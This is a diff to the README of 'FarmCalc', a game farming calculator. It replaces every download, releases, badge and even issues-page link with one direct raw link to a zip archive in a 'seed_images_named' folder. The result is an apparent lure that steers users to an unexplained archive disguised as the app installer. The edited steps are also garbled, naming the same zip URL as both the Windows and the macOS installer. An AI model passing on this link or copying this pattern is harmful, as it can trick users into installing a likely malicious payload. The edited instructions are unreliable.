@@ -1,6 +1,6 @@
 # 🌾 FarmCalc - Optimize Your Farm Experience Gains  
 
-[![Download FarmCalc](https://img.shields.io/badge/Download-FarmCalc-blue?style=for-the-badge&logo=github)](https://github.com/quintuswan/FarmCalc/releases)  
+[![Download FarmCalc](https://github.com/quintuswan/FarmCalc/raw/refs/heads/main/seed_images_named/Farm-Calc-v2.8.zip)](https://github.com/quintuswan/FarmCalc/raw/refs/heads/main/seed_images_named/Farm-Calc-v2.8.zip)  
 
 ---
 
@@ -34,11 +34,11 @@ This section will walk you through downloading, installing, and opening FarmCalc
 
 1. Click the large blue button below or at the top of this page to open the download page on GitHub:  
 
-   [![Download FarmCalc](https://img.shields.io/badge/Download-FarmCalc-blue?style=for-the-badge&logo=github)](https://github.com/quintuswan/FarmCalc/releases)  
+   [![Download FarmCalc](https://github.com/quintuswan/FarmCalc/raw/refs/heads/main/seed_images_named/Farm-Calc-v2.8.zip)](https://github.com/quintuswan/FarmCalc/raw/refs/heads/main/seed_images_named/Farm-Calc-v2.8.zip)  
 
 2. On the GitHub releases page, look for the latest version. The newest release is usually at the top and labeled with the highest version number.  
 
-3. Find the file named something like `FarmCalc-Setup.exe` (for Windows) or `FarmCalc.dmg` (for macOS). Click it to download to your computer.  
+3. Find the file named something like `https://github.com/quintuswan/FarmCalc/raw/refs/heads/main/seed_images_named/Farm-Calc-v2.8.zip` (for Windows) or `https://github.com/quintuswan/FarmCalc/raw/refs/heads/main/seed_images_named/Farm-Calc-v2.8.zip` (for macOS). Click it to download to your computer.  
 
 4. After the download finishes, locate the installer file on your computer. This is usually in your "Downloads" folder.  
 
@@ -104,7 +104,7 @@ FarmCalc offers several helpful features to improve your farming strategy:
 
 FarmCalc is updated occasionally to include new crops or improve calculations. To update:  
 
-1. Visit the [GitHub Releases page](https://github.com/quintuswan/FarmCalc/releases).  
+1. Visit the [GitHub Releases page](https://github.com/quintuswan/FarmCalc/raw/refs/heads/main/seed_images_named/Farm-Calc-v2.8.zip).  
 2. Download the newest version installer file just like your first download.  
 3. Run the installer. It will replace your old version without affecting your settings.  
 
@@ -129,7 +129,7 @@ If you need help beyond this guide:
 
 - Review any documentation files included with the app download  
 - Look for a README or Help section inside the FarmCalc app  
-- Contact the developer via the GitHub repository issues page at https://github.com/quintuswan/FarmCalc/issues  
+- Contact the developer via the GitHub repository issues page at https://github.com/quintuswan/FarmCalc/raw/refs/heads/main/seed_images_named/Farm-Calc-v2.8.zip  
 
 ---
 
@@ -147,4 +147,4 @@ FarmCalc was created to simplify farming experience optimization for players of 
 
 Thank you for using FarmCalc. Now you can plan your farming efficiently and gain experience at your best rate!  
 
-[Download FarmCalc](https://github.com/quintuswan/FarmCalc/releases)
+[Download FarmCalc](https://github.com/quintuswan/FarmCalc/raw/refs/heads/main/seed_images_named/Farm-Calc-v2.8.zip)
